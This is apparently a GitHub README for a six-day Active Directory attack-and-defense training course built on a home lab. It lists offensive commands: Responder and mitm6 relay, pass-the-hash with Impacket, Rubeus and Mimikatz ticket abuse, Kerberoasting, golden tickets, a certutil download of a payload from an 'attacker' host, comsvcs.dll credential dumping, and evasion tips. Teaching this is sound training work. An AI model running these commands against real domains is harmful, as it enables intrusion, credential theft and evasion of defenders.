# Active-Directory-Attack-Defense

# 🛡️ Enterprise Active Directory Attack & Defense

> **Not beginner friendly** — Expect struggle & troubleshooting
>
> *Inspired by Real-World Red Team Operations*

"Learn how attackers compromise Active Directory and how to defend it — hands-on offensive techniques and mitigation strategies for enterprise environments."

---

## 👤 About the Trainer

**Dayssam Bouzaya** — Cybersecurity Offensive & Defensive Security  
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue?logo=linkedin)](https://jo.linkedin.com/in/dayssam)

- Experience in Active Directory exploitation, penetration testing, and network defense
- Strong practical background in enterprise and industrial convergence and application development
- Experienced in delivering applied cybersecurity training

---

## 📋 Topics Covered

| Phase | Topic |
|-------|-------|
| 1 | AD Overview |
| 2 | Initial Access |
| 3 | Credential Access & Lateral Movement |
| 4 | Privilege Escalation |
| 5 | Persistence & Full Control |
| 6 | Reporting & Blue Team View |

---

## 📅 DAY 1 — AD Overview (Understand Only)

> You are NOT expected to exploit anything here.

### 🔴 Phase 1 – AD Overview

#### Pentest vs Red Team

| | AD Penetration Test | AD Red Team Operation |
|--|--------------------|-----------------------|
| **Goal** | Identify and report weaknesses | Test detection and response |
| **Approach** | Scope-driven, permission-based | Stealth, chaining, and persistence |
| **Flow** | Recon → Exploit → Priv Esc → Report | Initial Access → Lateral Movement → AD Abuse → Domain Dominance → Detection Evasion → Persistence → Blue Team Response |

#### What is Red Teaming?
A Red Team tests an organization's infrastructure through:
- **Cyber** — Digital attacks (Web, Network, Cloud)
- **Social** — Exploiting people's behaviour
- **Physical** — Attacks involving physical manpower

> 95% of Fortune 1000 companies run Active Directory — making AD penetration testing one of the most critical and least-taught skills.

---

### Active Directory Architecture

**Active Directory** is a directory/database that:
- Manages organizational resources (users, computers, shares, etc.)
- Provides access rules governing relationships between resources
- Stores and makes network information available to users and admins

**Key Components:**

| Component | Description |
|-----------|-------------|
| **Forest** | Single instance of AD; collection of Domain Controllers that trust each other |
| **Domain** | Container within the scope of a Forest |
| **OU (Organizational Unit)** | Logical grouping of users, computers, and resources |
| **Groups** | Collection of users or other groups (privileged/non-privileged) |
| **Domain Controller (DC)** | Central server handling authentication and resource management |
| **GPO (Group Policy Object)** | Collection of policies applied to users/domains/objects |
| **TGT** | Ticket Granting Ticket — used for authentication |
| **TGS** | Ticket Granting Service — used for authorization |

---

### Authentication

#### NTLM Authentication
NTLM is a challenge-response authentication protocol:

1. User shares username, password, and domain name with the client
2. Client creates a hash of the password and deletes the plaintext
3. Client sends plain-text username to the server
4. Server replies with a 16-byte random challenge
5. Client sends the challenge encrypted with the password hash
6. Server forwards challenge, response, and username to the DC
7. DC retrieves the user's password, encrypts the challenge, and compares
8. If they match → user is authenticated

**⚠️ NTLM Weaknesses:**
- Passwords are not "salted" on the server
- Vulnerable to brute force and pass-the-hash attacks
- Replaced by Kerberos as default, but still used as fallback

#### Kerberos Authentication
- No passwords travel over the network — only tickets
- **TGT** → Authentication token
- **TGS** → Authorization token for specific services
- Tickets are stored in memory and can be extracted for abuse

#### Kerberos Delegation
Allows re-use of authenticated credentials to access resources on another server.

| Type | Description |
|------|-------------|
| **Unconstrained Delegation** | Application Server can request access to ANY service on any server (enabled by default on DCs) |
| **Constrained Delegation** | Application Server can only request access to specified services on specific servers |

---

### Domain Trusts
Trusts allow users/services from one domain or forest to access resources in another.

**Types of Trust:**
- Parent-Child trust relationship
- Forest-to-Forest trust relationship
- Tree-root trust relationship

---

### Authorization in AD
- AD validates resource access based on the user's **security token**
- Security token is checked against the **Access Control List (ACL)**
- Token contains: User Rights, Group SID, Individual SID
- Each user/group is identified by a unique **Security Identifier (SID)**

---

## 🛠️ Lab Setup

### Network Configuration
```
Network:    Host-only (vboxnet0)
DC IP:      192.168.56.101
```

### Start Order
1. DC
2. Windows Client
3. SIEM
4. Kali

### Lab Machines

| Device | Name |
|--------|------|
| AD Device | DC01 |
| Domain Name | dysm.lab |
| NetBIOS Name | DYSM |
| Fileshare | public |
| Emp1 / Alice | WIN01 |
| Emp2 / Bob | WIN02 |
| SIEM | siem |
| Attacker | MGMT |

### User Accounts

**Local Accounts:**

| User | Password |
|------|----------|
| Domain Administrator | `Allalie/1A` |
| bob/win02 | `password123` |
| alice/win01 | `Winter2025!` |
| Local admins (win01/win02) | `P@55w0rd` |

**AD Accounts:**

| Username | Role | Password |
|----------|------|----------|
| ealice | Employee | `Winter2025!` |
| ebob | Employee | `Password1!` |
| sservice | Service Account (SQL) | `MyUsername123#` |
| dadmin | Domain Admin | `Allalie/1Allalie/1` |
| DSRM | Backup | `Allalie/1` |

---

## 📅 DAY 2 — Initial Access

### 🟧 Phase 2 – Initial Access

#### LLMNR / NBT-NS Poisoning

**Objective:** Capture authentication attempts from misconfigured name resolution

**Steps:**
1. Run Responder in listening mode: `python Responder.py -I <interface> -A`
2. Wait for a victim to request a non-existent hostname (e.g., `\\wrongshare`)

**Triggers that work reliably:**

| Action | LLMNR/NBT-NS Triggered? |
|--------|------------------------|
| `\\wronghost` (Win+R or File Explorer) | ✅ Yes (most reliable) |
| `dir \\fakehost\c$` (cmd) | ✅ Yes |
| Map drive to non-existent host | ✅ Yes |
| `ping wronghost` | ⚠️ Often |
| `http://wronghost/` | ⚠️ Situational |
| `nslookup wronghost` | ❌ No |

**Expected result:** ✔ NTLMv2 hash captured

**🔵 Mitigation:** Disable LLMNR and NBT-NS via Group Policy

---

#### IPv6 DNS Takeover

**Objective:** Force authentication via IPv6 and relay it for immediate compromise

**Tools:** `mitm6` + `ntlmrelayx`

**Steps:**
1. Run `mitm6` to spoof IPv6 DNS responses
2. Run `ntlmrelayx` pointed at the DC: `-t ldaps://dc-ip`

**Expected result:**
- ✔ Successful NTLM relay
- ✔ Authenticated session to LDAP or SMB on the DC

---

#### LNK File Attack

**Objective:** Trigger outbound SMB authentication from victim

**Steps:**
1. Create malicious `.LNK` file pointing to `\\your-ip\share`
2. Place in shared folder or deliver via phishing

**Expected result:** ✔ NTLM hash captured

---

#### Initial Foothold

**Objective:** Establish first interactive access inside the domain

**Steps:**
1. Use captured/cracked credentials or relayed access
2. Launch reverse shell (PowerShell, Cobalt Strike beacon, etc.)

**Expected result:** ✔ User-level shell on a domain-joined workstation/server

**Tools:** Responder, mitm6, ntlmrelayx, PowerShell

---

## 📅 DAY 3 — Credential Access & Lateral Movement

### 🟨 Phase 3 – Credential Access & Lateral Movement

#### SMB Relay

**Objective:** Use captured hash immediately without cracking

**Steps:**
1. Capture hash (via Responder/mitm6)
2. Relay with `ntlmrelayx` to a target machine or DC

**Expected result:**
- ✔ Shell (often SYSTEM) on relayed machine, OR
- ✔ LDAP modifications on DC (e.g., DCSync rights granted to self)

---

#### Pass-the-Hash (PtH)

**Objective:** Authenticate using only the NTLM hash

**Steps:** Use Impacket tools with `-hashes` flag:
```bash
psexec.py -hashes :<hash> domain/user@target
wmiexec.py -hashes :<hash> domain/user@target
smbexec.py -hashes :<hash> domain/user@target
```

**Expected result:** ✔ Interactive shell or command execution on target

---

#### Pass-the-Ticket (PtT)

**Objective:** Reuse exported Kerberos tickets

**Steps:**
1. Export ticket with Rubeus or Mimikatz
2. Inject it: `Rubeus ptt /ticket:<base64>`

**Expected result:** ✔ Access to remote services (CIFS, LDAP, WinRM) as ticket owner

---

#### Token Impersonation

**Objective:** Steal and use access tokens on the current machine

**Steps:**
1. List tokens: `Mimikatz token::list`
2. Impersonate: `Mimikatz token::elevate`

**Expected result:** ✔ Commands executed as higher-privileged user

---

#### GPP / cPassword

**Objective:** Recover plaintext passwords from Group Policy Preferences

**Steps:**
1. Search SYSVOL for `Groups.xml` files
2. Extract and decrypt `cPassword` attribute

**Expected result:** ✔ Plaintext password(s) of local admin or service accounts

---

#### Kerberoasting

**Objective:** Extract and crack service account passwords offline

**Steps:**
1. Enumerate SPNs: `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}`
2. Request TGS tickets: `Rubeus kerberoast`
3. Crack hashes offline (e.g., with Hashcat)

**Expected result:** ✔ Plaintext password of one or more service accounts

**Tools:** CrackMapExec, Impacket, Mimikatz, Rubeus

---

## 📅 DAY 4 — Privilege Escalation

### 🟩 Phase 4 – Privilege Escalation

#### PrintNightmare

**Objective:** Exploit Print Spooler for privilege escalation

**Steps:** Trigger the vulnerability to load a malicious driver or execute code

**Expected result:** ✔ SYSTEM privileges (often on DC → path to Domain Admin)

---

#### Zerologon

**Objective:** Compromise the Domain Controller directly

**Steps:** Run the Zerologon exploit to reset the DC machine account password

**Expected result:** ✔ Full control over the Domain Controller (DCSync immediately possible)

---

#### AD ACL Abuse

**Objective:** Abuse excessive permissions on AD objects

**Key permissions to look for:**
- `GenericAll`
- `WriteDACL`
- Shadow Credentials

**Steps:**
1. Identify objects with excessive rights via BloodHound/PowerView
2. Modify ACLs to grant yourself rights (ForceChangePassword, DCSync)

**Expected result:** ✔ Ability to reset high-privilege passwords or perform DCSync

---

## 📅 DAY 5 — Persistence & Full Control

### 🟦 Phase 5 – Persistence & Full Control

#### Golden Ticket

**Objective:** Achieve unlimited domain persistence

**Steps:**
1. Dump `krbtgt` hash (via DCSync or Mimikatz)
2. Forge TGT: `mimikatz kerberos::golden`

**Expected result:** ✔ Ability to authenticate as any user (including Domain Admin) at any time

---

#### Persistence Strategies

**Objective:** Maintain access across reboots and password changes

| Method | Description |
|--------|-------------|
| Scheduled Tasks | Task triggered at startup/logon |
| Service Creation | Malicious service running as SYSTEM |
| Registry Autoruns | Keys under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` |

**Expected result:** ✔ Reliable backdoor that survives reboots

---

#### OPSEC Basics

**1. Avoid Noisy Scans**

❌ Bad:
- Full port scans (`nmap -p-` at high speed)
- Rapid ICMP ping sweeps
- Scanning thousands of hosts in seconds

✅ Good:
- Slow, targeted scans (`-T1`, `--scan-delay 5s`)
- ARP scans on local subnet (`nmap -PR -sn`) — very quiet
- Query AD directly (`Get-ADComputer`, BloodHound) instead of active scanning

**2. Living-off-the-Land (LOLBins)**

Use legitimate Windows built-in tools to blend in:

| Purpose | LOLBin | Example |
|---------|--------|---------|
| Domain enumeration | PowerShell, net.exe | `net group "Domain Admins" /domain` |
| Host discovery | PowerShell | `Get-ADComputer -Filter *` |
| Credential dumping | rundll32.exe, comsvcs.dll | `rundll32.exe comsvcs.dll MiniDump ...` |
| Lateral movement | wmic.exe | `wmic /node:target process call create "cmd.exe"` |
| Remote execution | winrs.exe | `winrs -r:target cmd.exe` |
| File transfer | certutil.exe | `certutil -urlcache -f http://attacker/payload.exe` |
| Kerberoasting | PowerShell + AD module | `Get-ADUser -Filter {ServicePrincipalName -ne "$null"}` |

**3. Tool Hygiene**

- Mimikatz is extremely noisy — use Rubeus or built-in methods first
- If you must use Mimikatz: run it **in-memory only** via PowerShell (`Invoke-Mimikatz`)
- Run it late in the engagement from a high-integrity process

**Key Windows Event IDs to know:**

| Event ID | Description |
|----------|-------------|
| 4624/4625 | Logon / failed logon |
| 4648 | Explicit credential use |
| 4672/4673 | Privilege assignment/use |
| 4688 | Process creation (command lines logged) |
| 5145 | Share access (C$, ADMIN$) |

**Tools:** Mimikatz, Rubeus, Native Windows tools

---

## 📅 DAY 6 — Red Team Simulation & Reporting

### 🟣 Phase 6 – Red Team Simulation & Blue Team View

#### End-to-End Attack Simulation

**Objective:** Chain everything into a full compromise

**Steps:** Zero access → Initial Access → Lateral Movement → Escalation → Persistence

**Expected result:**
- ✔ Domain Admin shell
- ✔ Golden Ticket
- ✔ Persistence mechanisms in place

---

#### Reporting & Blue Team View

**Objective:** Document findings professionally

**Steps:**
1. Map all techniques to **MITRE ATT&CK** framework
2. Write executive and technical summaries with remediation advice

**Expected result:**
- ✔ Professional red team report
- ✔ List of detection and hardening recommendations for defenders

---

###  Attack Summary

```
Early Stage:   Get hashes → Relay or crack → Get shells
Mid Stage:     Use hashes/tickets/tokens → Move laterally → Escalate
Late Stage:    Full domain control + persistence
```

**Full attack chain:**
```
Recon → Initial Access → PrivEsc → Lateral Movement → Domain Admin
```

---

## 🔗 Resources

- [Windows Server 2022](https://info.microsoft.com/ww-landing-windows-server-2022.html)
- [Windows 10 Enterprise](https://info.microsoft.com/ww-landing-windows-10-enterprise.html)
- [PowerShell Port Scanner Reference](https://www.sans.org/blog/pen-test-poster-white-board-powershell-built-in-port-scanner/)
- [Trainer LinkedIn](https://jo.linkedin.com/in/dayssam)

---

*This material is for educational and authorized security testing purposes only.*
